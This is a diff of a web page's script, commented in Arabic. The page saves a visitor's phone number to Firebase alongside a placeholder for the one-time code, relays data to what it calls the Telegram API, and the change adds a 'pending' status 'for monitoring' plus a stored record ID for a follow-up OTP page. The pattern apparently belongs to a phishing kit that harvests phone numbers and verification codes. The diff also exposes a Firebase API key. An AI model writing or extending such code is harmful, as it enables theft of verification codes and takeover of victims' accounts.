@@ -97,7 +97,7 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
-    // إعدادات Firebase الخاصة بك
+    // إعدادات Firebase
     const firebaseConfig = {
         apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
         authDomain: "barq-9ba61.firebaseapp.com",
@@ -129,14 +129,18 @@
             localStorage.setItem('userPhone', phone);
 
             try {
-                // 1. الحفظ في Firebase مع إضافة التوقيت للترتيب
-                await addDoc(collection(db, "users"), {
+                // 1. الحفظ في Firebase مع إضافة حالة "pending" و استخراج الـ ID
+                const docRef = await addDoc(collection(db, "users"), {
                     phone: phone,
                     otp: "بانتظار الرمز...",
-                    timestamp: serverTimestamp() // هذا السطر هو سر الترتيب
+                    status: "pending", // هذه الحالة ضرورية للمراقبة
+                    timestamp: serverTimestamp()
                 });
+                
+                // 2. حفظ الـ ID الخاص بالمستخدم في المتصفح لاستخدامه في صفحة OTP
+                localStorage.setItem('currentDocId', docRef.id);
 
-                // 2. الإرسال للـ API الخاص بالتليجرام
+                // 3. الإرسال للـ API الخاص بالتليجرام
                 fetch('/api/send', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -151,6 +155,7 @@
         }
     });
 </script>
+
 
 </body>
 </html>
